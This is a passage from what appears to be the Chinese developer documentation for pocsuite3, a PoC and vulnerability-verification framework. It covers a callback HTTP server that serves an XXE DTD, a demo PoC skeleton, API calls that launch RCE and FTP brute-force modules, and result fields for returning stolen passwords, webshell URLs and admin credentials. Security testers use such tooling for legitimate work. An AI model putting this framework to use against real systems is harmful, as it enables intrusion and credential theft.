            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', '{}'.format(count))
            self.end_headers()
            self.wfile.write(xxe_dtd.encode())
            return
        self.send_response(status)
        self.send_header('Content-Type', 'text/html')
        self.send_header("Content-Length", "{}".format(count))
        self.end_headers()

    def do_HEAD(self):
        status = 404

        if self.path.endswith('jar'):
            status = 200
        self.send_response(status)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", "0")
        self.end_headers()


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['seebug']
    vulDate = '2018-03-08'
    createDate = '2018-04-12'
    updateDate = '2018-04-13'
    references = ['']
    name = ''
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = ''
    desc = '''
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result = {}
        '''Simple http server demo
           default params:
           		bind_ip='0.0.0.0'
           		bind_port=666
           		is_ipv6=False
           		use_https=False
           		certfile=os.path.join(paths.POCSUITE_DATA_PATH, 'cacert.pem')
                requestHandler=BaseRequestHandler
           You can write your own handler, default list current directory
        '''
        httpd = PHTTPServer(requestHandler=MyRequestHandler)
        httpd.start()

        # Write your code
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    _attack = _verify


register_poc(DemoPOC)

```



 

### pocsuite3 集成调用<div id="pocsuite_import"></div>

pocsuite3 api 提供了集成调用` pocsuite3` 的全部功能函数，可参见测试用例 `tests/test_import_pocsuite_execute.py`。典型的集成调用方法如下：

```python
from pocsuite3.api import init_pocsuite
from pocsuite3.api import start_pocsuite
from pocsuite3.api import get_results


def run_pocsuite():
    # config 配置可参见命令行参数， 用于初始化 pocsuite3.lib.core.data.conf
    config = {
    'url': ['http://127.0.0.1:8080', 'http://127.0.0.1:21'],
    'poc': ['ecshop_rce', 'ftp_burst']
    }
    
    init_pocsuite(config)
    start_pocsuite()
    result = get_results()

```

#### PoC 规范说明<div id="PoCstandard"></div>

#### PoC 编号说明<div id="idstandard"></div>
PoC 编号ID 与漏洞 ID 一致.

示例, 漏洞库中的漏洞统一采用“SSV-xxx”编号的方式, 则 PoC 编号为 xxx


#### PoC 命名规范<div id="namedstandard"></div>

PoC 命名分成3个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名称中的所有字母改成小写,所有的符号改成_.
文件名不能有特殊字符和大写字母 最后出来的文件名应该像这样

```
    _1847_seeyon_3_1_login_info_disclosure.py
```
#### PoC 第三方模块依赖说明<div id="requires"></div>
PoC 编写的时候要求尽量不要使用第三方模块，如果必要使用，请在 PoC 的基础信息部分，增加 install_requires 字段，按照以下格式填写依赖的模块名。
```
install_requires =[str_item_,str_item,…] # 整个字段的值为list，每个项为一个依赖模块
```

str_item 格式：模块名==版本号，模块名为pip install 安装时的模块名（请不要填写 import 的模块名）

如果遇到安装时模块名与调用时的不一致情况，用`:`分割开，例如常见的加密算法库`pycryptodome`,但是调用是以`from Crypto.Cipher import AES`,此时就需要如下填写
```python
install_requires = ['pycryptodome:Crypto']
```


#### PoC 结果返回规范<div id="resultstandard"></div>

result 为PoC返回的结果数据类型, result返回值要求返回完整的一项, 暂不符合result字段的情况, 放入extra字段中, 此步骤必须尽可能的保证运行者能够根据信息 复现/理解 漏洞, 若果步骤复杂, 在取证信息中说明. 例如:

```python
  #返回数据库管理员密码
  result['DBInfo']['Password']='xxxxx'
  #返回 Webshell 地址
  result['ShellInfo']['URL'] = 'xxxxx'
  #返回网站管理员用户名
  result['AdminInfo']['Username']='xxxxx'
```

**extra 字段说明**<div id="result_extara"></div>
extra字段为通用结果字段的补充字段，如果需要返回的内容中不属于通用结果字段，那么可以使用extra字段进行赋值。extra字段为dict格式，可自定义key进行赋值，如
```
result['extra' ]['field'] = 'aa'
```

**特殊字段：** evidence，针对结果中返回取证信息，定义字段名只允许为evidence，并且只能存储于extar字段，即
```
result['extra' ]['evidence'] = 'aa'
```

**通用字段说明**<div id="result_common"></div>
```
result：[
    {  name: 'DBInfo'，        value：'数据库内容' }，
        {  name: 'Username'，      value: '管理员用户名'},
        {  name: 'Password'，      value：'管理员密码' }，
        {  name: 'Salt'，          value: '加密盐值'},
        {  name: 'Uid'，           value: '用户ID'},
        {  name: 'Groupid'，       value: '用户组ID'},

    {  name: 'ShellInfo'，     value: 'Webshell信息'},
        {  name: 'URL'，           value: 'Webshell地址'},
        {  name: 'Content'，       value: 'Webshell内容'},

    {  name: 'FileInfo'，      value: '文件信息'},
        {  name: 'Filename'，      value: '文件名称'},
        {  name: 'Content'，       value: '文件内容'},

    {  name: 'XSSInfo'，       value: '跨站脚本信息'},
        {  name: 'URL'，           value: '验证URL'},
        {  name: 'Payload'，       value: '验证Payload'},

    {  name: 'AdminInfo'，     value: '管理员信息'},
        {  name: 'Uid'，           value: '管理员ID'},
        {  name: 'Username'，      value: '管理员用户名'},
        {  name: 'Password'，      value: '管理员密码'},

    {  name: 'Database'，      value：'数据库信息' }，
        {  name: 'Hostname'，      value: '数据库主机名'},
        {  name: 'Username'，      value：'数据库用户名' }，
        {  name: 'Password'，      value: '数据库密码'},
        {  name: 'DBname'，        value: '数据库名'},

    {  name: 'VerifyInfo'，    value: '验证信息'},
        {  name: 'Target'，        value: '验证host:port'},
        {  name: 'URL'，           value: '验证URL'},
        {  name: 'Postdata'，      value: '验证POST数据'},
        {  name: 'Path'，          value: '网站绝对路径'},

    {  name: 'SiteAttr'，      value: '网站服务器信息'},
    {  name: 'Process'，       value: '服务器进程'}

    ]

```


##### 漏洞类型规范<div id="vulcategory"></div>

<table border=1>
    <tr><td>英文名称</td><td>中文名称</td><td>缩写</td></tr>
    <tr><td>Cross Site Scripting </td><td> 跨站脚本 </td><td> xss</td></tr>
    <tr><td>Cross Site Request Forgery </td><td> 跨站请求伪造 </td><td> csrf</td></tr>
    <tr><td>SQL Injection </td><td> Sql注入 </td><td> sql-inj</td></tr>
    <tr><td>LDAP Injection </td><td> ldap注入 </td><td> ldap-inj</td></tr>
    <tr><td>Mail Command Injection </td><td> 邮件命令注入 </td><td> smtp-inj</td></tr>
    <tr><td>Null Byte Injection </td><td> 空字节注入 </td><td> null-byte-inj</td></tr>
    <tr><td>CRLF Injection </td><td> CRLF注入 </td><td> crlf-inj</td></tr>
    <tr><td>SSI Injection </td><td> Ssi注入 </td><td> ssi-inj</td></tr>
    <tr><td>XPath Injection </td><td> Xpath注入 </td><td> xpath-inj</td></tr>
    <tr><td>XML Injection </td><td> Xml注入 </td><td> xml-inj</td></tr>
    <tr><td>XQuery Injection </td><td> Xquery 注入 </td><td> xquery-inj</td></tr>
    <tr><td>Command Execution </td><td> 命令执行 </td><td> cmd-exec</td></tr>
    <tr><td>Code Execution </td><td> 代码执行 </td><td> code-exec</td></tr>
    <tr><td>Remote File Inclusion </td><td> 远程文件包含 </td><td> rfi</td></tr>
    <tr><td>Local File Inclusion </td><td> 本地文件包含 </td><td> lfi</td></tr>
    <tr><td>Abuse of Functionality </td><td> 功能函数滥用 </td><td> func-abuse</td></tr>
    <tr><td>Brute Force </td><td> 暴力破解 </td><td> brute-force</td></tr>
    <tr><td>Buffer Overflow </td><td> 缓冲区溢出 </td><td> buffer-overflow</td></tr>
    <tr><td>Content Spoofing </td><td> 内容欺骗 </td><td> spoofing</td></tr>
    <tr><td>Credential Prediction </td><td> 证书预测 </td><td> credential-prediction</td></tr>
    <tr><td>Session Prediction </td><td> 会话预测 </td><td> session-prediction</td></tr>
    <tr><td>Denial of Service </td><td> 拒绝服务 </td><td> dos</td></tr>
    <tr><td>Fingerprinting </td><td> 指纹识别 </td><td> finger</td></tr>
    <tr><td>Format String </td><td> 格式化字符串 </td><td> format-string</td></tr>
    <tr><td>HTTP Response Smuggling </td><td> http响应伪造 </td><td> http-response-smuggling</td></tr>
    <tr><td>HTTP Response Splitting </td><td> http响应拆分 </td><td> http-response-splitting</td></tr>
    <tr><td>HTTP Request Splitting </td><td> http请求拆分 </td><td> http-request-splitting</td></tr>
    <tr><td>HTTP Request Smuggling </td><td> http请求伪造 </td><td> http-request-smuggling</td></tr>
    <tr><td>HTTP Parameter Pollution </td><td> http参数污染 </td><td> hpp</td></tr>
    <tr><td>Integer Overflows </td><td> 整数溢出 </td><td> int-overflow</td></tr>
    <tr><td>Predictable Resource Location </td><td> 可预测资源定位 </td><td> res-location</td></tr>
    <tr><td>Session Fixation </td><td> 会话固定 </td><td> session-fixation</td></tr>
    <tr><td>URL Redirector Abuse </td><td> url重定向 </td><td> redirect</td></tr>
    <tr><td>Privilege Escalation </td><td> 权限提升 </td><td> privilege-escalation</td></tr>
    <tr><td>Resolve Error </td><td> 解析错误 </td><td> resolve-error</td></tr>
    <tr><td>Arbitrary File Creation </td><td> 任意文件创建 </td><td> file-creation</td></tr>
    <tr><td>Arbitrary File Download </td><td> 任意文件下载 </td><td> file-download</td></tr>
    <tr><td>Arbitrary File Deletion </td><td> 任意文件删除 </td><td> file-deletion</td></tr>
    <tr><td>Backup File Found </td><td> 备份文件发现 </td><td> bak-file-found</td></tr>
    <tr><td>Database Found </td><td> 数据库发现 </td><td> db-found</td></tr>
    <tr><td>Directory Listing </td><td> 目录遍历 </td><td> dir-listing</td></tr>
    <tr><td>Directory Traversal </td><td> 目录穿越 </td><td> dir-traversal</td></tr>
    <tr><td>File Upload </td><td> 文件上传 </td><td> file-upload</td></tr>
    <tr><td>Login Bypass </td><td> 登录绕过 </td><td> login-bypass</td></tr>
    <tr><td>Weak Password </td><td> 弱密码 </td><td> weak-pass</td></tr>
    <tr><td>Remote Password Change </td><td> 远程密码修改 </td><td> remote-pass-change</td></tr>
    <tr><td>Code Disclosure </td><td> 代码泄漏 </td><td> code-disclosure</td></tr>
    <tr><td>Path Disclosure </td><td> 路径泄漏 </td><td> path-disclosure</td></tr>
    <tr><td>Information Disclosure </td><td> 信息泄漏 </td><td> info-disclosure</td></tr>
    <tr><td>Security Mode Bypass </td><td> 安全模式绕过 </td><td> sec-bypass</td></tr>
    <tr><td>Malware </td><td> 挂马 </td><td> mal</td></tr>
    <tr><td>Black Link </td><td> 暗链 </td><td> black-link</td></tr>
    <tr><td>Backdoor </td><td> 后门 </td><td> backdoor</td></tr>

</table>

也可以参见[漏洞类型规范](http://seebug.org/category)



### 演示视频